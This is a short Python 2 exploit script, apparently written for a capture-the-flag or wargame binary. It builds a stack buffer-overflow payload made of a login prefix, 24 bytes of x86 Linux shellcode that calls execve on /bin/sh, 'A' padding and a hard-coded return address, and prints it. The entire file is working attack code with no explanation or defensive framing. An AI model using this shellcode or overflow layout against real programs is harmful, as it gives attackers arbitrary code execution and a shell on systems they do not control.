import struct
# len = 24
shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
def pack(addr):
    return struct.pack("<I", addr);

login = "dat_wil "
padding = "A" * (0xff - len(login + shellcode) + 0x50)
land = pack(0x0804a048);

print login + shellcode + padding + land

